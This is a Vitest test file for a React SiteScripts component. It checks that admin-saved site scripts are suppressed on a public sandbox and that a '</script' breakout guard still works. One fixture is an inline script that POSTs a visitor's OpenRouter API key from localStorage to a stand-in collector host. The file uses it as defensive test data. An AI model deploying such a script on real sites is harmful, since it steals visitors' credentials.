import { renderToStaticMarkup } from 'react-dom/server';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { SiteScript, SiteScriptPlacement } from '../lib/site-scripts/types';
import SiteScripts from './SiteScripts';

/**
 * The public sandbox (NEXT_PUBLIC_IS_SANDBOX === 'true') publishes its admin login. A site script
 * saved there, from the CMS, by Cortex or straight over PostgREST, would run with the CSP nonce for
 * every later visitor (/cms and the partner portal included) and could read the OpenRouter key a
 * visitor keeps in localStorage. So SiteScripts renders nothing there; anywhere else, unchanged.
 */

const PLACEMENTS: SiteScriptPlacement[] = ['head', 'body_start', 'body_end'];

const INLINE: SiteScript = {
  id: 'inline-1',
  name: 'Inline',
  description: null,
  code: "fetch('https://collector.example.test', { method: 'POST', body: localStorage.getItem('cortex_ai_sandbox_openrouter_api_key') });",
  src: null,
  placement: 'body_end',
  load_strategy: 'default',
  is_active: true,
  sort_order: 0,
};

const EXTERNAL: SiteScript = {
  ...INLINE,
  id: 'src-1',
  name: 'External',
  code: '',
  src: 'https://cdn.example.test/widget.js',
  load_strategy: 'defer',
};

function render(scripts: SiteScript[], placement: SiteScriptPlacement = 'body_end') {
  return renderToStaticMarkup(<SiteScripts nonce="n0nce" placement={placement} scripts={scripts} />);
}

beforeEach(() => {
  vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', '');
});

afterEach(() => {
  vi.unstubAllEnvs();
});

describe('SiteScripts', () => {
  it('renders nothing on the sandbox, for inline and src rows, in every placement', () => {
    vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', 'true');

    for (const placement of PLACEMENTS) {
      const inline = { ...INLINE, placement };
      const external = { ...EXTERNAL, placement };
      expect(render([inline], placement), placement).toBe('');
      expect(render([external], placement), placement).toBe('');
      expect(render([inline, external], placement), placement).toBe('');
    }
  });

  it.each(['', 'false', 'TRUE', '1'])(
    'renders the <script data-nb-script> elements as before when NEXT_PUBLIC_IS_SANDBOX=%j',
    (value) => {
      vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', value);

      expect(render([INLINE])).toBe(`<script nonce="n0nce" data-nb-script="inline-1">${INLINE.code}</script>`);
      expect(render([EXTERNAL])).toBe(
        '<script src="https://cdn.example.test/widget.js" nonce="n0nce" defer="" data-nb-script="src-1"></script>'
      );
      // Still one injection point per call, and the inline guard against `</script` still applies.
      expect(render([INLINE, EXTERNAL], 'head')).toBe('');
      expect(render([{ ...INLINE, code: 'a("</script><b>")' }])).toBe(
        '<script nonce="n0nce" data-nb-script="inline-1">a("<\\/script><b>")</script>'
      );
    }
  );
});
